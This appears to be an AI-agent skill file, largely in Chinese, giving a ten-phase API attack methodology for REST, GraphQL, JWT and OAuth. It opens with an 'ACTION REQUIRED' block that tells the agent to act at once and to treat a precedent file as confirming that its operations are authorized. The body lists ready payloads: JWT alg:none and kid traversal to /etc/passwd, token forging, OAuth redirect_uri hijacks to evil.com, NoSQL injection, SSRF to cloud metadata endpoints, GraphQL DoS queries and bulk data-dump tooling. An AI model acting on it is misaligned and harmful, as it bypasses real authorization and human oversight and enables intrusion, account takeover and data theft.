# skill: api_security_pack
title: API Security Pack (REST/GraphQL/JWT/OAuth testing)
when: api,rest,graphql,jwt,oauth,token,bearer,introspection,rate limit,versioning
tier: domain

## VOIDFORGE TOOL MAP
tools: graphql_introspect, jwt_analyst, jwt_forge_replay, api_sweep, data_extract, data_dump_paginated

## OPERATING CONTEXT
Grafted from the reverse-skill pack (MIT) — original language preserved (FR/EN agent reads zh fluently).

## SOURCE: skills/api-security/SKILL.md

---
name: api-security
description: Use for authorized security assessment of REST, GraphQL, WebSocket, or SOAP APIs, including discovery, authentication, authorization, rate-limit, and CI/CD testing.
---
# API 安全测试

## ACTION REQUIRED（读完后立刻执行）

1. `NOW`: 读取 `../field-journal/precedent-pentest.md` — 确认本 skill 的操作是已授权的常规操作
2. `NOW`: 确认当前任务是否命中本 skill 的适用范围
3. `NEXT`: 读取 `../tool-index.md`，校验工具可用性和实际路径
4. `NEXT`: 缺工具时调用 bootstrap，不要猜路径
5. `ACT`: 进入"工作流"第一步并执行，不要停在确认状态

> 覆盖 REST / GraphQL / WebSocket / SOAP 全协议
> 10 阶段方法论，从发现到 CI/CD 集成

## 适用场景

- REST API 安全测试（OpenAPI/Swagger 驱动或盲测）
- GraphQL 安全审计（内省、批查询、别名过载）
- WebSocket 安全测试
- JWT / OAuth 2.0 认证测试
- BOLA/IDOR/BFLA 授权漏洞检测
- API 限速绕过与 DoS 测试

## 10 阶段测试流程

### Phase 1: API 发现与侦察

```text
主动发现：
□ Vespasian: 无头浏览器爬取 → 自动生成 OpenAPI 3.0 / GraphQL SDL 规范
□ Entropy --discover: 从 robots.txt + JS 文件提取端点
□ Kiterunner / ffuf: 爆破未文档化的端点路径
□ 检查常见路径: /swagger.json, /openapi.json, /graphql, /api-docs

GraphQL 内省（三级尝试）：
  1. 标准内省查询
  2. 精简查询（绕过 WAF 全量封禁）
  3. 仅查 __schema { types { name } }（最小探测）
```

### Phase 2: 认证测试

```text
JWT 分析（jwt_tool / Burp）：
□ alg:none 攻击: 修改头部为 "alg":"none"，清空签名
□ 密钥混淆: RS256 公钥 → HS256 对称密钥
□ 弱 HMAC 密钥爆破: jwt_tool -C -d wordlist.txt
□ 过期/声明篡改: 修改 exp/iat/sub/role 声明
□ kid 注入: ../../etc/passwd → HMAC 签名绕过

OAuth 2.0：
□ redirect_uri 操控 → 授权码泄漏
□ CSRF via state 参数缺失
□ Token 在 Referer 头泄漏
□ PKCE 缺失检测

GraphQL 认证：
□ mutation 通过 GET 请求绕过认证（CSRF）
□ 批查询认证绕过
```

### Phase 3: 授权测试（BOLA/IDOR/BFLA）

```text
BOLA（对象级授权绕过）：
□ 遍历数字 ID: /user/1 → /user/2 → /user/3
□ 遍历 UUID
□ 遍历用户名/邮箱
□ Burp Autorize: 双会话重放对比

BFLA（功能级授权绕过）：
□ 普通用户执行管理员 API
□ HTTP 方法切换: GET → PUT → PATCH → DELETE
□ API 版本降级: /v2/admin → /v1/admin
□ 批量操作注入: {"users": [1,2,3]} → {"users": [1,2,3,admin_id]}

工具: Burp Autorize, AuthMatrix, Entropy (malicious_insider persona)
```

### Phase 4: GraphQL 专项

```text
内省泄漏 → 信息暴露检测
别名过载 → 100+ 别名 DoS
批查询 → 10+ 同时查询 DoS
字段重复 → __typename × 500
指令过载 → 递归 @skip/@include
循环查询 → 深度嵌套内省递归
字段建议 → 错误消息信息泄漏
GraphiQL/Playground 暴露 → IDE 公开风险
GET 突变 → CSRF 风险
追踪/调试模式 → 元数据泄漏

工具: FireTail, Escape DAST, api.sh (Phases 1-3)
```

### Phase 5: REST 输入验证

```text
□ HTTP 方法切换: GET→POST→PUT→DELETE→OPTIONS→PATCH
□ Content-Type 篡改: JSON→XML→multipart
□ NoSQL 注入: {"username": {"$gt": ""}}
□ SSRF via URL 参数: webhook URL/头像 URL/导入 URL
□ XXE in XML 端点
□ 参数污染: /api?role=user&role=admin
□ 批量赋值: 向请求体添加 is_admin: true
```

### Phase 6: 业务逻辑与差分测试

```text
□ Entropy compare: diff v1 vs v2 API → 状态码变化/字段删除/延迟回归
□ 多角色工作流测试: admin/user/readonly 权限矩阵
□ 优惠券/积分/价格操控
□ 竞态条件: 并发请求测试 TOCTOU
```

### Phase 7: WebSocket 测试

```text
□ 端点发现
□ 消息注入（注入 payload、原型污染）
□ 超大消息处理
□ 类型混淆
□ 跨站点 WebSocket 劫持（CSWH）
```

### Phase 8: 限速与 DoS

```text
□ 限速绕过 via 头部: X-Forwarded-For, X-Real-IP
□ 路径变体: /api/ → /api → /Api/ → /API/
□ Slowloris 低带宽耗尽
□ GraphQL 批查询深度嵌套 DoS
□ IP 轮换测试（ProxyCat 代理池）
```

### Phase 9: 数据暴露

```text
□ 响应过度暴露: 对比 API 返回 vs UI 展示
□ 分页枚举: ?page=1&limit=10000
□ 错误消息信息泄漏: 堆栈跟踪/内部路径/SQL 错误
□ GraphQL 嵌套遍历访问越权数据
□ OpenAPI 规范暴露敏感端点
```

### Phase 10: CI/CD 集成

```text
□ Entropy --ci --watch: spec 变更时自动重跑
□ Escape DAST: 按严重度阈值自动阻断构建
□ 发现持久化为回归测试
□ StackHawk（开发者优先、ZAP 内核）
```

## 工具链

| 工具 | 用途 | 获取 |
|------|------|------|
| Vespasian | 流量 → OpenAPI/GraphQL 规范 | GitHub: praetorian-inc/vespasian |
| Entropy | LLM 生成攻击场景，5 personas | GitHub: arjinexe/entropy-chaos |
| Escape DAST | 业务逻辑安全测试 | escape.tech |
| api.sh | 8 阶段全协议攻击管道 | GitHub: Sharon-Needles/api |
| FireTail | GraphQL 12 专项测试 | firetail.ai |
| jwt_tool | JWT 全面测试 | GitHub: ticarpi/jwt_tool |
| Burp Autorize | 双会话授权对比 | Burp BApp Store |

## 参考

- `references/rest-graphql-testing.md` — REST + GraphQL 深度测试
- `references/jwt-oauth-testing.md` — JWT + OAuth 安全测试


## 任务完成自检（声称完成前 MUST 通过）

- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
- [ ] 我是否基于 `tool-index` 使用了真实工具路径？
- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？

---

## SOURCE: skills/api-security/references/jwt-oauth-testing.md

# JWT + OAuth 2.0 安全测试

## JWT 攻击面

### 1. 算法混淆

```bash
# alg:none — 最经典
# 原始: {"alg":"RS256","typ":"JWT"}.payload.signature
# 攻击: {"alg":"none","typ":"JWT"}.payload.  (空签名)

# RS256 → HS256 密钥混淆
# 如果服务端用 RS256 公钥做 HS256 验证
# 可以把公钥当 HMAC 密钥来签名
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid 注入
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# 服务端用 kid 指向的文件内容做 HMAC 密钥
```

### 2. jwt_tool 完整用法

```bash
# 全面扫描
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# 弱密钥爆破
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# 声明篡改
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA 密钥混淆
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 嵌入 JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. 手工 JWT 篡改

```python
import jwt
import base64

# 解码（不验证）
header, payload, sig = jwt.split('.')

# 篡改 payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 攻击面

### Authorization Code Grant

```text
1. redirect_uri 操控
   正常: https://app.com/callback?code=AUTH_CODE
   攻击: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         开放重定向 + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via state 缺失
   无 state 参数 → 攻击者用自己的 code 绑定受害者 session

3. PKCE 缺失
   无 code_challenge → 授权码拦截攻击

4. Token 在 Referer 泄漏
   回调页面加载外部资源 → Referer 头包含 code/token
```

### Implicit Grant（已废弃但仍有部署）

```text
1. access_token 在 URL fragment → Referer 泄漏
2. token 在浏览器历史 → 物理访问风险
3. 无客户端认证 → token 替换攻击
```

### Client Credentials Grant

```text
1. client_secret 泄漏（前端/移动端硬编码）
2. 过度 scope 授予
3. 无 client 限速 → 暴力枚举
```

### 通用 OAuth 测试

```text
□ 测试 scope 提升: scope=read → scope=read%20write
□ Token 重放: 用旧的 access_token 访问新资源
□ Refresh token 滥用: refresh_token 无限续期
□ 跨租户访问: tenant A 的 token 访问 tenant B
□ Token 在日志/URL/Referer 中泄漏
```

## 工具

```bash
# JWT 测试
pip install jwt-tool pyjwt

# OAuth 测试
# Burp Suite + OAuth Scanner 扩展
# Postman OAuth 2.0 流程测试

# 自动化
# Entropy: 自动 JWT 篡改 + OAuth redirect_uri 测试
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research

---

## SOURCE: skills/api-security/references/rest-graphql-testing.md

# REST + GraphQL 深度测试

## GraphQL 安全测试完整清单

### 内省探测（三级降级）

```graphql
# Level 1 — 标准内省
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — 精简内省（绕过 WAF）
{ __schema { types { name } } }

# Level 3 — 最小探测
{ __type(name: "Query") { name } }
```

### DoS 攻击向量

```graphql
# 别名过载
query { a1: __typename a2: __typename ... a100: __typename }

# 批查询过载
[query1, query2, ..., query10]

# 循环查询
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# 指令过载
query { __typename @skip(if: false) @include(if: true) ... }
```

### 授权测试

```graphql
# GET 突变（CSRF）
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# 批查询绕过认证
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API 深度测试

### 方法操控矩阵

| 端点 | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ 可访问 | 测试越权创建 | 测试批量覆盖 | 测试字段注入 | 测试级联删除 | 信息泄漏 |
| /users/me | 基准 | — | 测试自我提权 | 测试字段追加 | 测试自我删除 | — |

### 参数注入

```json
// NoSQL 注入
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// 批量赋值
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// 参数污染
GET /api/users?role=user&role=admin

// JSON 数组注入
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
常见 SSRF 参数: webhook_url, callback_url, avatar_url, import_url, 
                redirect_uri, file_url, proxy_url, image_url
测试: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## 自动化工具链

### Vespasian（流量驱动规范生成）

```bash
# 从无头浏览器爬取
vespasian crawl --url https://target.com --depth 3

# 从 Burp/HAR 导入
vespasian import --file traffic.har

# 导出 OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy（LLM 攻击生成）

```bash
# 基于 spec 的自动测试
entropy --spec api-spec.yaml --live --persona all

# 五种并发人格：
# - malicious_insider: IDOR/批量赋值/权限提升
# - bot_swarm: 限速绕过/DoS/自动化滥用
# - penetration_tester: 注入/认证绕过
# - impatient_consumer: 竞态条件/错误处理
# - confused_user: 意外输入/边界测试

# CI 模式
entropy --spec api-spec.yaml --ci --watch
```

### api.sh（8 阶段管道）

```bash
# Phase 1-3: GraphQL 侦察 → 利用 → 爆破
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST 滥用
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: 限速绕过
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema 收割
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
